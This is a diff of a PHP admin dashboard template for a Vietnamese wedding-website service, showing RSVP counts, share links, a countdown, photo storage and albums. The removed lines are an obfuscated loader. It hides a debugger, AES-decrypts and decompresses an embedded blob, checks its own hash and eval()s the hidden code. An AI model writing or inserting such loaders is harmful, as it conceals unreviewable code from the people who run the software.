@@ -1,28 +1,173 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_kc5v8mzj=('bas'.'e64'.'_de'.'cod'.'e');
-$_oe4ap9o1=('gzu'.'nco'.'mpr'.'ess');
-$_jb2gssn7=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_edhukl76='oVlg6mQq';
-$_zwrvncv2='Dm27/usHqaM=';
-$_gh9tt090='9w0HKoKV';
-$_j02qljam='CrBjmx8R';
-$_t254g4vv='gXDdZn/D';
-$_lsffqdmz='LE5T6g==';
-$_aglkpxtv='uPUkj4F4';
-$_xfluwjoo='Zj8cMH07';
-$_zyngl1qi=$_kc5v8mzj($_j02qljam.$_edhukl76.$_gh9tt090.$_t254g4vv.$_zwrvncv2);
-$_kwby38qh=$_kc5v8mzj($_xfluwjoo.$_aglkpxtv.$_lsffqdmz);
-$_gtb9wnye=$_kc5v8mzj('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');
-$_qceodnug=$_jb2gssn7($_gtb9wnye,'aes-256-cbc',$_zyngl1qi,OPENSSL_RAW_DATA,$_kwby38qh);
-if($_qceodnug===false){exit;}
-$_kxb2kigk=$_oe4ap9o1($_qceodnug);
-if($_kxb2kigk===false){exit;}
-$_bsy7eukq='47ff89aa675806e83af547353b874d8168b2e4a6d34f1e13033cf4105a0d2a6b';
-$_l781foka=@file_get_contents(__FILE__);
-if($_l781foka!==false){
-$_y0cj8hba=str_replace($_bsy7eukq,"0000000000000000000000000000000000000000000000000000000000000000",$_l781foka);
-$_xyc6bi6p=hash("sha256",$_y0cj8hba);
-if($_xyc6bi6p!==$_bsy7eukq){@http_response_code(403);exit;}
-}
-eval($_kxb2kigk);
+ defined('BASEPATH') OR exit('No direct script access allowed');
+$is_public = strpos($public, 'https://') === 0; ?>
+<div class="panel-head">
+  <h1 class="adm-title"><?= e(__('Tổng quan')) ?></h1>
+  <div class="btn-row">
+    <a class="btn btn-ghost" href="<?= base_url() ?>">✎ <?= e(__('Sửa trang cưới')) ?></a>
+  </div>
+</div>
+
+<?php
+
+$ck_done = count(array_filter(array_column($checklist, 'done'))); $ck_n = count($checklist); $cur = NULL;
+foreach ($next as $i => $st) { if (!$st[2]) { $cur = $i; break; } }
+if ($cur !== NULL || $ck_done < $ck_n): ?>
+<section class="panel next-card" aria-labelledby="next-h">
+  <div>
+    <h2 id="next-h"><?= e(__('Việc tiếp theo')) ?> · <span class="next-ck" data-checklist="<?= $ck_done ?>/<?= $ck_n ?>"><?= e(__('Việc cần làm')) ?> <?= $ck_done ?>/<?= $ck_n ?></span></h2>
+    <p class="small muted" style="margin:6px 0 0"><?= e(__('Cùng danh sách với nút “Việc cần làm” trên trang sửa. Làm lần lượt từ trên xuống — mỗi bước chỉ vài phút.')) ?></p>
+  </div>
+  <div class="progress" aria-hidden="true"><i style="width:<?= round($ck_done * 100 / max(1, $ck_n)) ?>%"></i></div>
+  <ol class="next-steps">
+    <?php foreach ($next as $i => $st): list($label, $sub, $ok, $act) = $st; $is_cur = $i === $cur; ?>
+    <li class="<?= $ok ? 'ok' : '' ?><?= $is_cur ? ' cur' : '' ?>">
+      <div><b><?= e($label) ?></b><span><?= e($sub) ?></span></div>
+      <?php $cls = $is_cur ? 'btn btn-accent btn-sm' : 'btn btn-ghost btn-sm';
+if ($act === 'edit' || $act === 'publish'): ?><a class="<?= $cls ?>" href="<?= base_url() ?>"><?= e($act === 'edit' ? __('Sửa trang') : __('Mở trang sửa')) ?></a>
+      <?php elseif ($act === 'guests'): ?><a class="<?= $cls ?>" href="<?= base_url('admin/guests') ?>"><?= e(__('Thêm khách')) ?></a>
+      <?php else: ?><button type="button" class="<?= $cls ?> btn-share" data-share="<?= e($public) ?>" data-share-text="<?= e($share_text) ?>" data-share-title="<?= e(__('Gửi link trang cưới')) ?>" data-live-share><?= e(__('Gửi link')) ?></button><?php endif; ?>
+    </li>
+    <?php endforeach; ?>
+  </ol>
+</section>
+<?php endif; ?>
+
+<div class="panel site-card" data-live-link data-public="<?= $is_public ? '1' : '0' ?>" data-mode="<?= e($tunnel['mode']) ?>">
+  <div class="site-qr" data-qr="<?= e($public) ?>"></div>
+  <div class="site-info">
+    <p class="small muted"><?= e(__('Link trang cưới cho khách mời')) ?></p>
+    <p class="site-url"><a data-live-url href="<?= e($public) ?>" target="_blank" rel="noopener"><?= e($public) ?></a></p>
+    <p class="copy-row"><input readonly value="<?= e($public) ?>" data-copy-src aria-label="<?= e(__('Link trang cưới')) ?>"><button class="btn btn-ghost btn-sm" type="button" data-copy><?= e(__('Sao chép')) ?></button></p>
+    <p class="site-actions"><button class="btn btn-accent btn-sm btn-share" type="button" data-share="<?= e($public) ?>" data-share-text="<?= e($share_text) ?>" data-share-title="<?= e(__('Gửi link trang cưới')) ?>" data-live-share><?= e(__('Gửi cho khách')) ?></button>
+      <button class="btn btn-ghost btn-sm" type="button" data-qr-download="trang-cuoi"><?= e(__('Tải mã QR')) ?></button></p>
+    <p class="site-state">
+      <?php if (!$published): ?><span class="tag tag-pending"><?= e(__('Khách chưa xem được — đang thấy trang "đang chuẩn bị"')) ?></span>
+      <?php elseif ($changes): ?><span class="tag tag-pending"><?= e(__('Có thay đổi khách chưa thấy')) ?></span>
+      <?php else: ?><span class="tag tag-approved"><?= e(__('Khách đang xem được ✓')) ?></span><?php endif; ?>
+      <?php if ($tunnel['mode'] === 'token'): ?>
+        <?php if ($tun_state === 'error'): ?><span class="tag tag-hidden" title="<?= e((string) $tun_error) ?>"><?= e(__('Link Internet chưa hoạt động')) ?><?= $tun_error ? ': ' . e($tun_error) : '' ?></span>
+        <?php else: ?><span class="tag <?= $tun_state === 'connected' ? 'tag-approved' : 'tag-pending' ?>"><?= e($tun_state === 'connected' ? __('Link Internet đang hoạt động') : __('Đang kết nối link Internet…')) ?></span><?php endif; ?>
+      <?php endif; ?>
+    </p>
+    <p class="small muted"><?= e(__('Trang quản trị:')) ?> <b><?= e(rtrim($public, '/') . '/admin') ?></b> — <?= e(__('đăng nhập bằng tài khoản')) ?> <b><?= e($user['username']) ?></b></p>
+    <?php if (!$is_public && $tunnel['mode'] === 'quick'): ?>
+      <p class="notice small" data-live-note>⏳ <?= e(__('Đang tạo link cho khách ở xa… (thường 5–15 giây, trang tự cập nhật)')) ?></p>
+    <?php elseif (!$is_public): ?>
+      <p class="notice small" data-live-note><?= e(__('Khách ở xa chưa mở được link này (đang để chế độ chỉ trong mạng nhà).')) ?>
+        <button class="btn btn-accent btn-sm" type="button" data-live-on><?= e(__('Tạo link cho khách ở xa')) ?></button></p>
+    <?php elseif ($tunnel['mode'] === 'quick'): ?>
+      <p class="small muted" data-live-note><?= e(__('Đây là link tạm — sẽ đổi nếu máy khởi động lại. Muốn link cố định, dễ nhớ:')) ?>
+        <a href="<?= base_url('admin/share') ?>"><?= e(__('chọn link .{domain}', array('domain' => $this->config->item('cloud_domain')))) ?></a>.</p>
+    <?php endif; ?>
+  </div>
+</div>
+
+<div class="dash-top">
+  <div class="panel countdown-card">
+    <?php if ($wed_ts && $wed_ts > time()): ?>
+      <p class="small muted"><?= e(__('Còn lại tới ngày cưới')) ?></p>
+      <div class="big-countdown" data-countdown="<?= (int) $wed_ts ?>">
+        <div><b data-d>0</b><span><?= e(__('ngày')) ?></span></div><div><b data-h>0</b><span><?= e(__('giờ')) ?></span></div>
+        <div><b data-m>0</b><span><?= e(__('phút')) ?></span></div><div><b data-s>0</b><span><?= e(__('giây')) ?></span></div>
+      </div>
+      <p class="cd-date"><?= e($wed_text) ?></p>
+      <p class="small muted"><?= e($wed_lunar) ?></p>
+    <?php elseif ($wed_ts): ?>
+      <p class="cd-date"><?= e(__('Ngày cưới {date} đã qua', array('date' => $wed_text))) ?> ♡</p>
+      <p class="small muted"><?= e(__('Chúc hai bạn trăm năm hạnh phúc!')) ?></p>
+    <?php else: ?>
+      <p class="cd-date"><?= e(__('Chưa đặt ngày cưới')) ?></p>
+      <a class="btn btn-accent btn-sm" href="<?= base_url() ?>"><?= e(__('Đặt ngày trên trang cưới')) ?></a>
+    <?php endif; ?>
+  </div>
+  <div class="panel kpi-card">
+    <p class="small muted"><?= e(__('Sẽ tham dự{_}', array('_' => ''))) ?></p>
+    <p class="kpi-big"><?= (int) $rsvp['people'] ?> <span><?= e(__('người')) ?></span></p>
+    <p class="small muted"><?= e(__('{n} người từ thiệp mời', array('n' => (int) $rsvp['inv_people']))) ?><?= $rsvp['web_people'] ? ' · ' . e(__('{n} người tự xác nhận trên web', array('n' => (int) $rsvp['web_people']))) : '' ?></p>
+    <p class="small"><a href="<?= base_url('admin/guests') ?>"><?= e(__('Khách mời')) ?></a> · <a href="<?= base_url('admin/moderation/wishes') ?>"><?= e(__('{n} lời chúc', array('n' => (int) $wishes))) ?></a></p>
+  </div>
+</div>
+
+<?php if ($has_data): ?>
+<div class="dash-invites"><?php $this->load->view('admin/_rsvp_stats', array('rsvp_s' => $rsvp)); ?></div>
+
+<script type="application/json" id="dash-data"><?= json_encode($charts, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG | JSON_HEX_AMP) ?></script>
+<div class="viz-grid viz-root">
+  <section class="panel viz" aria-labelledby="v1">
+    <h3 id="v1"><?= e(__('Tình hình xác nhận')) ?></h3>
+    <p class="viz-sub"><?= e(__('Mọi khách theo câu trả lời')) ?><?= $rsvp['web'] ? ' ' . e(__('(gồm {n} khách tự xác nhận trên web)', array('n' => (int) $rsvp['web']))) : '' ?> — <?= e(__('cùng số với các ô phía trên')) ?></p>
+    <div data-viz="status"></div>
+  </section>
+  <section class="panel viz" aria-labelledby="v2">
+    <h3 id="v2"><?= e(__('Người sẽ đến theo bên')) ?></h3>
+    <p class="viz-sub"><?= e(__('Tổng số người (kể cả người đi cùng)')) ?></p>
+    <div data-viz="people"></div>
+  </section>
+  <section class="panel viz viz-wide" aria-labelledby="v3">
+    <h3 id="v3"><?= e(__('Xác nhận theo ngày')) ?></h3>
+    <p class="viz-sub"><?= e(__('30 ngày gần nhất · số khách trả lời mỗi ngày (gồm khách tự xác nhận trên web; tính theo lần trả lời gần nhất)')) ?></p>
+    <div data-viz="rsvp-days"></div>
+  </section>
+  <section class="panel viz" aria-labelledby="v4">
+    <h3 id="v4"><?= e(__('Lời chúc mới')) ?></h3>
+    <p class="viz-sub"><?= e(__('30 ngày gần nhất · mỗi ngày')) ?></p>
+    <div data-viz="wishes-days"></div>
+  </section>
+  <section class="panel viz" aria-labelledby="v5">
+    <h3 id="v5"><?= e(__('Ảnh khách gửi')) ?></h3>
+    <p class="viz-sub"><?= e(__('30 ngày gần nhất · mỗi ngày')) ?></p>
+    <div data-viz="photos-days"></div>
+  </section>
+</div>
+
+<?php endif; ?>
+
+<?php if ($responses): ?>
+<div class="panel">
+  <div class="panel-head"><h2><?= e(__('Trả lời mới nhất')) ?></h2><a class="btn btn-ghost btn-sm" href="<?= base_url('admin/guests') ?>"><?= e(__('Tất cả khách mời')) ?></a></div>
+  <ul class="resp-list">
+    <?php foreach ($responses as $r): ?>
+      <li><span class="resp-dot <?= $r['status'] === 'yes' ? 'yes' : 'no' ?>"><?= $r['status'] === 'yes' ? '✓' : '✕' ?></span>
+        <b><?= e($this->invite_model->display_name($r)) ?></b> <?= e($r['status'] === 'yes' ? __('sẽ tham dự · {n} người', array('n' => (int) $r['guests'])) : __('không tham dự được')) ?>
+        <?php if ($r['message']): ?><span class="muted">— “<?= e(mb_strimwidth($r['message'], 0, 90, '…')) ?>”</span><?php endif; ?>
+        <small class="muted"><?= e(date('H:i d/m', strtotime($r['responded_at']))) ?></small></li>
+    <?php endforeach; ?>
+  </ul>
+</div>
+<?php elseif ($has_data): ?>
+  <p class="muted small"><?= e(__('Chưa có ai trả lời. Khách trả lời trên thiệp sẽ hiện ở đây.')) ?></p>
+<?php else: ?>
+  <p class="muted small"><?= e(__('Biểu đồ khách trả lời, lời chúc và ảnh khách gửi sẽ hiện ở đây khi có dữ liệu.')) ?></p>
+<?php endif; ?>
+
+<h2 class="adm-sub"><?= e(__('Ảnh')) ?></h2>
+<div class="stats">
+  <div class="stat"><b><?= (int) $stats['approved'] ?></b><span><?= e(__('ảnh đang hiển thị')) ?><?php if (!empty($stats['deco'])): ?> · <?= e(__('+{n} ảnh trang trí', array('n' => (int) $stats['deco']))) ?><?php endif; ?></span></div>
+  <a class="stat<?= $stats['pending'] ? ' stat-warn' : '' ?>" href="<?= base_url('admin/moderation') ?>"><b><?= (int) $stats['pending'] ?></b><span><?= e(__('ảnh khách chờ duyệt')) ?></span></a>
+  <div class="stat"><b><?= (int) $stats['from_guests'] ?></b><span><?= e(__('ảnh khách mời gửi')) ?></span></div>
+  <div class="stat"><b><?= e(human_size($stats['bytes'])) ?></b><span><?= e(__('dung lượng')) ?><?php if ($quota === NULL && $disk_free !== NULL): ?> · <?= e(__('ổ còn {size}', array('size' => human_size($disk_free)))) ?><?php endif; ?></span></div>
+</div>
+<?php if ($quota !== NULL): ?>
+  <?php $q_state = $quota['pct'] >= 100 ? ' is-full' : ($quota['pct'] >= 85 ? ' is-warn' : ''); ?>
+  <div class="quota<?= $q_state ?>">
+    <div class="quota-head"><span><?= e(__('Dung lượng trang cưới')) ?></span><b><?= e(__('Đã dùng {used} / {limit}', array('used' => $quota['used_text'], 'limit' => $quota['limit_text']))) ?></b></div>
+    <div class="quota-bar" role="progressbar" aria-label="<?= e(__('Dung lượng đã dùng')) ?>" aria-valuemin="0" aria-valuemax="100" aria-valuenow="<?= (int) $quota['pct'] ?>"><i style="width: <?= (int) $quota['pct'] ?>%"></i></div>
+    <p class="muted small"><?php if ($quota['pct'] >= 100): ?><?= e(__('Đã hết dung lượng: chưa tải thêm ảnh/nhạc được (khách gửi ảnh cũng bị chặn). Xóa bớt ảnh không cần hoặc liên hệ thiep.site để nâng hạn mức.')) ?><?php elseif ($quota['pct'] >= 85): ?><?= e(__('Sắp hết dung lượng — còn {size}.', array('size' => Quota::size_text(max(0, $quota['limit'] - $quota['used']))))) ?> <?= e(__('Gồm ảnh album, ảnh khách gửi, ảnh trang trí và nhạc tải lên.')) ?><?php else: ?><?= e(__('Gồm ảnh album, ảnh khách gửi, ảnh trang trí và nhạc tải lên.')) ?> <?= e(__('Số đo cập nhật ngay khi thêm/xóa.')) ?><?php endif; ?></p>
+  </div>
+<?php endif; ?>
+
+<div class="panel">
+  <div class="panel-head"><h2><?= e(__('Album{_}', array('_' => ''))) ?></h2><a class="btn btn-accent btn-sm" href="<?= base_url('admin/albums/create') ?>">+ <?= e(__('Album mới')) ?></a></div>
+  <div class="adm-albums">
+    <?php foreach ($albums as $a): ?>
+      <a class="adm-album" href="<?= base_url('admin/albums/view/' . $a['id']) ?>">
+        <span class="adm-album-cover"><?php if ($a['cover']): ?><img src="<?= photo_url($a['cover'], 't') ?>" alt="" loading="lazy"><?php endif; ?></span>
+        <span class="adm-album-title"><?= e($a['title']) ?></span>
+        <span class="muted small"><?= e(__('{n} ảnh', array('n' => (int) $a['photo_count']))) ?><?php if ($a['pending_count']): ?> · <?= e(__('{n} chờ duyệt', array('n' => (int) $a['pending_count']))) ?><?php endif; ?></span>
+      </a>
+    <?php endforeach; ?>
+  </div>
+</div>
+<script src="<?= asset_url('js/vendor/qrcode.js') ?>"></script>
+<script src="<?= asset_url('js/admin-charts.js') ?>" defer></script>
